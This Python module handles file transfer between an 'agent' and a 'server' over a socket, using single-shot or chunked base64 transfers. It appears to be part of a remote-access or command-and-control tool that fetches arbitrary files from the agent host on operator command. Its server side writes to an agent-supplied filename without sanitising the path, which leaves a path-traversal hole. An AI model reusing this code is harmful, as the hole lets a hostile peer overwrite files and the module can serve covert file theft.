# modules/file_transfer.py
import os
import base64
from modules import comms

# Size of each chunk for streaming (8 KB)
CHUNK_SIZE = 8192  

def send(sock, cmd):
    """
    Agent-side: read the file in one go (legacy) or in chunks (new).
    For backward compatibility, we send a single-file response if small,
    otherwise switch to chunked protocol.
    """
    parts = cmd.strip().split(" ", 1)
    if len(parts) != 2:
        comms.rsend(sock, "Usage: download <filename>", dtype="error")
        return
    filename = parts[1]
    if not os.path.isfile(filename):
        comms.rsend(sock, f"File not found: {filename}", dtype="error")
        return

    filesize = os.path.getsize(filename)
    # If file is small enough, use legacy single-shot transfer
    if filesize <= CHUNK_SIZE * 2:
        with open(filename, "rb") as f:
            data = f.read()
        comms.rsend(sock, data, dtype="file", filename=filename)
        return

    # New chunked protocol
    with open(filename, "rb") as f:
        total = filesize
        # 1) announce start
        comms.rsend(sock, {"filename": filename, "total_size": total}, dtype="file_start")

        # 2) send chunks
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            b64 = base64.b64encode(chunk).decode()
            comms.rsend(sock, {"payload": b64}, dtype="file_chunk")

        # 3) finish
        comms.rsend(sock, {}, dtype="file_end")


def receive(sock, cmd, show_progress=False):
    """
    Server-side: trigger download then handle either legacy or chunked file transfer.
    show_progress=True to display a real-time percentage.
    """
    # Trigger the agent to send the file
    comms.rsend(sock, cmd, dtype="output")

    # First response
    resp = comms.rrecv(sock)
    if not resp:
        print("[!] No response (agent disconnected?)")
        return

    rtype = resp.get("type")

    # ── LEGACY SINGLE-SHOT TRANSFER ─────────────────────────────────────
    if rtype == "file":
        raw = resp["payload"]  # bytes
        filename = resp.get("filename", cmd.split(" ", 1)[1])
        with open(filename, "wb") as f:
            f.write(raw)
        print(f"[+] File saved as: {filename}")
        return

    # ── ERROR ───────────────────────────────────────────────────────────
    if rtype == "error":
        print(f"[!] {resp.get('payload')}")
        return

    # ── CHUNKED PROTOCOL BEGIN ─────────────────────────────────────────
    if rtype != "file_start":
        print(f"[!] Unexpected response type: {rtype}")
        return

    # Extract chunked metadata
    info = resp["payload"]
    filename = info["filename"]
    total_size = info["total_size"]
    written = 0

    # Prepare output file
    os.makedirs(os.path.dirname(filename) or ".", exist_ok=True)
    f = open(filename, "wb")

    # Receive chunks
    while True:
        part = comms.rrecv(sock)
        if not part:
            print("\n[!] Connection lost during transfer.")
            f.close()
            return

        ptype = part.get("type")
        if ptype == "file_chunk":
            chunk = base64.b64decode(part["payload"])
            f.write(chunk)
            written += len(chunk)

            if show_progress and total_size > 0:
                pct = int(written / total_size * 100)
                print(f"\r[+] Downloading {filename}: {pct:3d}%", end="", flush=True)

        elif ptype == "file_end":
            break

        elif ptype == "error":
            print(f"\n[!] {part.get('payload')}")
            f.close()
            return

        else:
            print(f"\n[!] Unexpected chunk type: {ptype}")
            f.close()
            return

    f.close()

    if show_progress:
        print(f"\r[+] Downloading {filename}: 100%")
    print(f"[+] File saved as: {filename}")
